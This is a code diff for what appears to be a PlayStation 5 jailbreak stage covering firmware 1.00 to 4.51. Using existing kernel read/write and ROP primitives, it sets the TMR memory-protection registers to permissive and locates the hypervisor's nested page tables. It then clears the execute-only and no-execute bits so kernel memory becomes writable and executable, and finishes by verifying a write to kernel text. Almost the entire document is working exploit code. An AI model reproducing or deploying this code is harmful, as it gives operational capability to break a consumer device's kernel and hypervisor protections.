@@ -3,11 +3,13 @@
 // TMR/XOT Defeat for PS5 (FW 1.00-4.51)
 // Disables TMR descriptors, then clears XOTEXT+NX in guest and nested page tables.
 
-const TMR_INDIRECT_ADDR = 0xF00C2080;
-const TMR_INDIRECT_DATA = 0xF00C2084;
-const TMR_CONFIG_VALID = 0x1;
-const TMR_CONFIG_PERMISSIVE = 0x3F07;
-const VMCB_NCR3 = 0xB0;
+const ECAM_B0D18F2    = 0xF00C2000;
+const TMR_INDEX_OFF   = 0x80;
+const TMR_DATA_OFF    = 0x84;
+const TMR_MAX         = 22;
+const TMR_CFG_PERMISSIVE = 0x3F07;
+const VMCB_NCR3       = 0xB0;
+const SYS_MDBG_SERVICE = 0x259;
 
 const PTE_PRESENT  = 0x001;
 const PTE_WRITE    = 0x002;
@@ -39,9 +41,7 @@ function computeDmapBase(dmpml4i, dmpdpi) {
     return new int64((dmpdpi << 30) >>> 0, (0xFFFF8000 | (dmpml4i << 7)) >>> 0);
 }
 
-function dmapVA(dmap, pa) {
-    return i64add(dmap, pa);
-}
+function dmapVA(dmap, pa) { return i64add(dmap, pa); }
 
 function ptePA(pte) {
     return new int64((pte.low & PTE_ADDR_LO) >>> 0, (pte.hi & PTE_ADDR_HI) >>> 0);
@@ -58,124 +58,180 @@ function ptePatch(pte, clrHi, clrLo, setHi, setLo) {
     return new int64(((pte.low & ~clrLo) | setLo) >>> 0, ((pte.hi & ~clrHi) | setHi) >>> 0);
 }
 
+// ---------------------------------------------------------------------------
+// UART logging via sys_mdbg_service (syscall 0x259)
+// ---------------------------------------------------------------------------
+var _uartBuf = null;
+
+async function uartLog(p, chain, msg) {
+    if (!_uartBuf) _uartBuf = p.malloc(256);
+    var len = Math.min(msg.length, 253);
+    for (var i = 0; i < len; i++) p.write1(_uartBuf.add32(i), msg.charCodeAt(i));
+    p.write1(_uartBuf.add32(len), 0x0A);
+    p.write1(_uartBuf.add32(len + 1), 0x00);
+    await chain.syscall(SYS_MDBG_SERVICE, 7, _uartBuf, 0);
+}
+
+// ---------------------------------------------------------------------------
+// TMR indirect register access (ECAM B0:D18:F2 + 0x80/0x84)
+// ---------------------------------------------------------------------------
+function ecamAddr(dmap) { return dmapVA(dmap, new int64(ECAM_B0D18F2, 0)); }
+
 async function tmrReadReg(krw, dmap, off) {
-    await krw.write4(dmap.add32(TMR_INDIRECT_ADDR), off);
-    return await krw.read4(dmap.add32(TMR_INDIRECT_DATA));
+    await krw.write4(ecamAddr(dmap).add32(TMR_INDEX_OFF), off);
+    return await krw.read4(ecamAddr(dmap).add32(TMR_DATA_OFF));
 }
 
 async function tmrWriteReg(krw, dmap, off, val) {
-    await krw.write4(dmap.add32(TMR_INDIRECT_ADDR), off);
-    await krw.write4(dmap.add32(TMR_INDIRECT_DATA), val);
+    await krw.write4(ecamAddr(dmap).add32(TMR_INDEX_OFF), off);
+    await krw.write4(ecamAddr(dmap).add32(TMR_DATA_OFF), val);
+}
+
+// ---------------------------------------------------------------------------
+// TMR defeat — scan all 22 entries, relax any covering the target PA
+// Matches reference tmr_relax_for_pa() approach
+// ---------------------------------------------------------------------------
+async function tmrRelaxForPA(krw, dmap, pa, log) {
+    var pa16 = (pa.hi << 16) | (pa.low >>> 16);
+    var count = 0;
+
+    for (var i = TMR_MAX - 1; i >= 0; i--) {
+        if (i === 19 || i === 20) continue;
+
+        var b = await tmrReadReg(krw, dmap, i * 0x10 + 0x00);
+        var l = await tmrReadReg(krw, dmap, i * 0x10 + 0x04);
+        var c = await tmrReadReg(krw, dmap, i * 0x10 + 0x08);
+
+        if ((c & 1) === 0) continue;
+        if ((pa16 >>> 0) < (b >>> 0) || (pa16 >>> 0) > (l >>> 0)) continue;
+
+        await tmrWriteReg(krw, dmap, i * 0x10 + 0x08, TMR_CFG_PERMISSIVE);
+        var nc = await tmrReadReg(krw, dmap, i * 0x10 + 0x08);
+        var ok = (nc === TMR_CFG_PERMISSIVE);
+
+        log("TMR[" + i + "] 0x" + c.toString(16) + " -> 0x" + nc.toString(16) + (ok ? " OK" : " FAIL"), ok ? LogLevel.INFO : LogLevel.ERROR);
+        if (!ok) throw new Error("TMR[" + i + "] defeat failed");
+        count++;
+    }
+    return count;
 }
 
 async function tmrDefeat(krw, dmap, log) {
     var fw = window.fw_float;
-    var targets = [
-        [16, "Kernel", 0],
-        [5,  "HV",     3.00],
-        [17, "HV",     3.00],
-    ];
 
-    for (var t = 0; t < targets.length; t++) {
-        var idx = targets[t][0], name = targets[t][1], minFw = targets[t][2];
-        if (fw < minFw) continue;
+    var ecamTest = await krw.read4(ecamAddr(dmap));
+    log("ECAM dev id=0x" + ecamTest.toString(16), LogLevel.LOG);
+    if (ecamTest === 0 || (ecamTest >>> 0) === 0xFFFFFFFF) {
+        throw new Error("ECAM not accessible via DMAP (got 0x" + ecamTest.toString(16) + ")");
+    }
 
-        var base = await tmrReadReg(krw, dmap, idx * 16);
-        var config = await tmrReadReg(krw, dmap, idx * 16 + 8);
+    var tmr16Base = await tmrReadReg(krw, dmap, 16 * 0x10);
+    if (tmr16Base === 0) throw new Error("TMR[16].base = 0 — can't find kernel PA");
+    var kernelPA = i64shl16(tmr16Base);
 
-        if (base === 0) { log("TMR[" + idx + "] (" + name + ") base=0, skip", LogLevel.LOG); continue; }
-        if (!(config & TMR_CONFIG_VALID)) { log("TMR[" + idx + "] (" + name + ") not valid, skip", LogLevel.LOG); continue; }
+    log("Kernel PA=0x" + kernelPA.toString(16), LogLevel.LOG);
 
-        await tmrWriteReg(krw, dmap, idx * 16 + 8, TMR_CONFIG_PERMISSIVE);
-        var nc = await tmrReadReg(krw, dmap, idx * 16 + 8);
-        var ok = (nc === TMR_CONFIG_PERMISSIVE);
+    var n = await tmrRelaxForPA(krw, dmap, kernelPA, log);
+    log("Relaxed " + n + " TMR(s) for kernel PA", LogLevel.INFO);
 
-        log("TMR[" + idx + "/" + name + "] 0x" + config.toString(16) + " -> 0x" + nc.toString(16) + (ok ? " OK" : " FAIL"), ok ? LogLevel.INFO : LogLevel.ERROR);
-        if (!ok) throw new Error("TMR[" + idx + "] defeat failed");
+    if (fw >= 3.00) {
+        var tmr17Base = await tmrReadReg(krw, dmap, 17 * 0x10);
+        if (tmr17Base !== 0) {
+            var hvPA = i64shl16(tmr17Base);
+            log("HV PA=0x" + hvPA.toString(16) + " (TMR17)", LogLevel.LOG);
+            var n2 = await tmrRelaxForPA(krw, dmap, hvPA, log);
+            log("Relaxed " + n2 + " TMR(s) for HV PA", LogLevel.INFO);
+        }
     }
 }
 
-function isKernelVA(v) {
-    return ((v.hi >>> 16) & 0xFFFF) === 0xFFFF && (v.low & 0xFFF) === 0;
-}
-
-async function readNcr3FromVmcb(krw, dmap, vmcbVA) {
-    var ncr3 = await krw.read8(vmcbVA.add32(VMCB_NCR3));
-    if ((ncr3.low !== 0 || ncr3.hi !== 0) && (ncr3.low & 0xFFF) === 0) return ncr3;
-
-    var vmcbPA = i64sub(vmcbVA, dmap);
-    ncr3 = await krw.read8(dmapVA(dmap, vmcbPA).add32(VMCB_NCR3));
-    if ((ncr3.low !== 0 || ncr3.hi !== 0) && (ncr3.low & 0xFFF) === 0) return ncr3;
-
+// ---------------------------------------------------------------------------
+// nCR3 discovery
+// ---------------------------------------------------------------------------
+function vmcbPAForCore(fw, core) {
+    if (fw >= 3.00 && fw <= 3.21) return new int64(0x6290B000 + core * 0x3000, 0);
+    if (fw >= 4.00 && fw <= 4.51) return new int64(0x62A05000 + core * 0x3000, 0);
     return null;
 }
 
 async function discoverNpt(krw, dmap, log) {
     var fw = window.fw_float;
 
-    var tmr16Base = await tmrReadReg(krw, dmap, 16 * 16);
-    var tmr16Size = await tmrReadReg(krw, dmap, 16 * 16 + 4);
-    if (tmr16Base === 0) throw new Error("TMR[16].base = 0");
+    // FW 3.00+: hardcoded VMCB PAs from reference implementation
+    var vmcbPA = vmcbPAForCore(fw, 0);
+    if (vmcbPA) {
+        log("VMCB[0] PA=0x" + vmcbPA.toString(16) + " (hardcoded)", LogLevel.LOG);
+        var ncr3 = await krw.read8(dmapVA(dmap, vmcbPA).add32(VMCB_NCR3));
+        if ((ncr3.low !== 0 || ncr3.hi !== 0) && (ncr3.low & 0xFFF) === 0) {
+            log("nCR3=0x" + ncr3.toString(16), LogLevel.INFO);
+            return ncr3;
+        }
+        log("Hardcoded VMCB nCR3 invalid: 0x" + ncr3.toString(16), LogLevel.ERROR);
+    }
 
+    // Fallback: scan HV data area for VMCB nCR3 signature
+    var tmr16Base = await tmrReadReg(krw, dmap, 16 * 0x10);
     var kernelPA = i64shl16(tmr16Base);
-    var hvDataPA = i64add(kernelPA, new int64(OFFSET_KERNEL_TEXT_SIZE, 0));
 
-    log("TMR[16] range=0x" + kernelPA.toString(16) + " size=0x" + (tmr16Size << 16).toString(16), LogLevel.LOG);
-    log("HV data PA=0x" + hvDataPA.toString(16), LogLevel.LOG);
+    var hvDataPA;
+    if (fw >= 3.00) {
+        var tmr17Base = await tmrReadReg(krw, dmap, 17 * 0x10);
+        hvDataPA = tmr17Base ? i64shl16(tmr17Base) : i64add(kernelPA, new int64(OFFSET_KERNEL_TEXT_SIZE, 0));
+    } else {
+        hvDataPA = i64add(kernelPA, new int64(OFFSET_KERNEL_TEXT_SIZE, 0));
+    }
 
-    if (fw < 3.00) {
+    log("Scanning HV data PA=0x" + hvDataPA.toString(16) + " for VMCB...", LogLevel.LOG);
+
+    // Try the vcpu struct walk first (FW < 3.00 layout)
+    if (fw < 3.00 && typeof OFFSET_HV_VCPU !== 'undefined') {
         for (var c = 0; c < 16; c++) {
             var ptrPA = hvDataPA.add32(OFFSET_HV_VCPU + c * OFFSET_HV_VCPU_CPUID);
-            var vmcbVA = await krw.read8(dmapVA(dmap, ptrPA));
+            var val = await krw.read8(dmapVA(dmap, ptrPA));
+            if (c < 4) log("vcpu[" + c + "] raw=0x" + val.toString(16), LogLevel.LOG);
 
-            if (c < 4) log("vcpu[" + c + "] raw=0x" + vmcbVA.toString(16), LogLevel.LOG);
+            // Try as kernel VA (page-aligned)
+            if (((val.hi >>> 16) & 0xFFFF) === 0xFFFF && (val.low & 0xFFF) === 0) {
+                var vmcbVirtPA = i64sub(val, dmap);
+                var ncr3 = await krw.read8(dmapVA(dmap, vmcbVirtPA).add32(VMCB_NCR3));
+                if ((ncr3.low !== 0 || ncr3.hi !== 0) && (ncr3.low & 0xFFF) === 0 && ncr3.hi < 0x10) {
+                    log("nCR3=0x" + ncr3.toString(16) + " (vcpu " + c + ", VA->PA)", LogLevel.INFO);
+                    return ncr3;
+                }
+            }
 
-            if (!isKernelVA(vmcbVA)) continue;
-
-            var ncr3 = await readNcr3FromVmcb(krw, dmap, vmcbVA);
-            if (!ncr3) continue;
-
-            log("nCR3=0x" + ncr3.toString(16) + " (core " + c + ")", LogLevel.INFO);
-            return ncr3;
+            // Try as physical address (non-zero, page-aligned, < 64GB)
+            if ((val.low !== 0 || val.hi !== 0) && (val.low & 0xFFF) === 0 && val.hi < 0x10) {
+                var ncr3 = await krw.read8(dmapVA(dmap, val).add32(VMCB_NCR3));
+                if ((ncr3.low !== 0 || ncr3.hi !== 0) && (ncr3.low & 0xFFF) === 0 && ncr3.hi < 0x10) {
+                    log("nCR3=0x" + ncr3.toString(16) + " (vcpu " + c + ", PA)", LogLevel.INFO);
+                    return ncr3;
+                }
+            }
         }
+    }
 
-        log("vcpu walk failed, scanning HV data for VMCB nCR3...", LogLevel.LOG);
-        for (var off = 0; off < 0x100000; off += 0x1000) {
-            var candidate = await krw.read8(dmapVA(dmap, hvDataPA.add32(off + VMCB_NCR3)));
-            if (candidate.low === 0 && candidate.hi === 0) continue;
-            if ((candidate.low & 0xFFF) !== 0) continue;
-            if (candidate.hi > 0xF) continue;
+    // Brute-force: scan each 4KB page in the HV data area for nCR3 at VMCB offset 0xB0
+    for (var off = 0; off < 0x100000; off += 0x1000) {
+        var candidate = await krw.read8(dmapVA(dmap, hvDataPA.add32(off + VMCB_NCR3)));
+        if (candidate.low === 0 && candidate.hi === 0) continue;
+        if ((candidate.low & 0xFFF) !== 0) continue;
+        if (candidate.hi > 0xF) continue;
 
-            var pml4e0 = await krw.read8(dmapVA(dmap, candidate));
-            if (!(pml4e0.low & PTE_PRESENT)) continue;
+        // Validate: PML4[0] should be present
+        var pml4e0 = await krw.read8(dmapVA(dmap, candidate));
+        if (!(pml4e0.low & PTE_PRESENT)) continue;
 
-            log("nCR3=0x" + candidate.toString(16) + " (scan off=0x" + off.toString(16) + ")", LogLevel.INFO);
-            return candidate;
-        }
-    } else {
-        var hvBssPA = i64add(hvDataPA, new int64(OFFSET_HV_BSS_OFF, 0));
-        var vcpuArrayPA = i64add(hvBssPA, new int64(OFFSET_HV_VCPU_ARRAY_OFF, 0));
-
-        for (var c = 0; c < 16; c++) {
-            var vcpuPA = vcpuArrayPA.add32(c * OFFSET_HV_VCPU_STRIDE);
-            var vmcbVA = await krw.read8(dmapVA(dmap, vcpuPA.add32(OFFSET_HV_VCPU_VMCB_PTR)));
-
-            if (c < 2) log("vcpu[" + c + "] ptr=0x" + vmcbVA.toString(16), LogLevel.LOG);
-
-            if (!isKernelVA(vmcbVA)) continue;
-
-            var ncr3 = await readNcr3FromVmcb(krw, dmap, vmcbVA);
-            if (c < 2) log("vcpu[" + c + "] ncr3=" + (ncr3 ? "0x" + ncr3.toString(16) : "null"), LogLevel.LOG);
-            if (!ncr3) continue;
-
-            log("nCR3=0x" + ncr3.toString(16) + " (core " + c + ")", LogLevel.INFO);
-            return ncr3;
-        }
+        log("nCR3=0x" + candidate.toString(16) + " (scan off=0x" + off.toString(16) + ")", LogLevel.INFO);
+        return candidate;
     }
 
     throw new Error("Failed to discover nCR3");
 }
 
+// ---------------------------------------------------------------------------
+// Page table patching
+// ---------------------------------------------------------------------------
 async function patchPageTables(krw, dmap, guestPml4VA, ncr3, vaStart, rangeSize, log) {
     var clrHi = PTE_XOTEXT_HI | PTE_NX_HI;
     var setLo = PTE_WRITE;
@@ -260,36 +316,38 @@ async function patchPageTables(krw, dmap, guestPml4VA, ncr3, vaStart, rangeSize,
     return count;
 }
 
-/**
- * Main entry point: disable TMR for kernel/HV, then clear XOTEXT in guest+nested page tables.
- * @param {Object} krw - kernel read/write primitives from umtx2 exploit
- * @param {Object} chain - ROP chain (worker_rop) for syscalls
- * @param {function} log - logging function
- */
-async function disableTmrAndXot(krw, chain, log) {
-    log("Stage: TMR/XOT Defeat", LogLevel.INFO);
+// ---------------------------------------------------------------------------
+// Entry point
+// ---------------------------------------------------------------------------
+async function disableTmrAndXot(krw, chain, log, p) {
+    async function dlog(msg, level) {
+        log(msg, level);
+        await uartLog(p, chain, "[TMR] " + msg);
+    }
+
+    await dlog("Stage: TMR/XOT Defeat", LogLevel.INFO);
 
     var dmpml4i = await krw.read4(krw.ktextBase.add32(OFFSET_KERNEL_DMPML4I));
     var dmpdpi = await krw.read4(krw.ktextBase.add32(OFFSET_KERNEL_DMPDPI));
     var dmap = computeDmapBase(dmpml4i, dmpdpi);
 
-    log("DMAP base=0x" + dmap.toString(16), LogLevel.INFO);
+    await dlog("DMAP base=0x" + dmap.toString(16), LogLevel.INFO);
 
-    await tmrDefeat(krw, dmap, log);
+    await tmrDefeat(krw, dmap, dlog);
 
-    var ncr3 = await discoverNpt(krw, dmap, log);
+    var ncr3 = await discoverNpt(krw, dmap, dlog);
 
     var pmapAddr = krw.ktextBase.add32(OFFSET_KERNEL_PMAP_STORE);
     var guestPml4VA = await krw.read8(pmapAddr.add32(OFFSET_KERNEL_PMAP_PM_PML4));
     if (guestPml4VA.low === 0 && guestPml4VA.hi === 0) throw new Error("Guest PML4 VA is 0");
 
-    log("Guest PML4=0x" + guestPml4VA.toString(16), LogLevel.LOG);
+    await dlog("Guest PML4=0x" + guestPml4VA.toString(16), LogLevel.LOG);
 
     var rangeSize = OFFSET_KERNEL_DATA + 0x7000000;
-    log("Setting RWX: 0x" + krw.ktextBase.toString(16) + " +0x" + rangeSize.toString(16), LogLevel.INFO);
+    await dlog("Setting RWX: 0x" + krw.ktextBase.toString(16) + " +0x" + rangeSize.toString(16), LogLevel.INFO);
 
-    var count = await patchPageTables(krw, dmap, guestPml4VA, ncr3, krw.ktextBase, rangeSize, log);
-    log("Patched " + count + " pages", LogLevel.INFO);
+    var count = await patchPageTables(krw, dmap, guestPml4VA, ncr3, krw.ktextBase, rangeSize, dlog);
+    await dlog("Patched " + count + " pages", LogLevel.INFO);
 
     await chain.syscall(SYS_SCHED_YIELD);
 
@@ -301,7 +359,7 @@ async function disableTmrAndXot(krw, chain, log) {
     await krw.write8(testAddr, orig);
 
     var ok = (after.low === canary.low && after.hi === canary.hi);
-    log(".text probe: " + (ok ? "OK" : "FAIL"), ok ? LogLevel.SUCCESS : LogLevel.ERROR);
+    await dlog(".text probe: " + (ok ? "OK" : "FAIL"), ok ? LogLevel.SUCCESS : LogLevel.ERROR);
 
     if (!ok) throw new Error("XOTEXT defeat verification failed");
 }
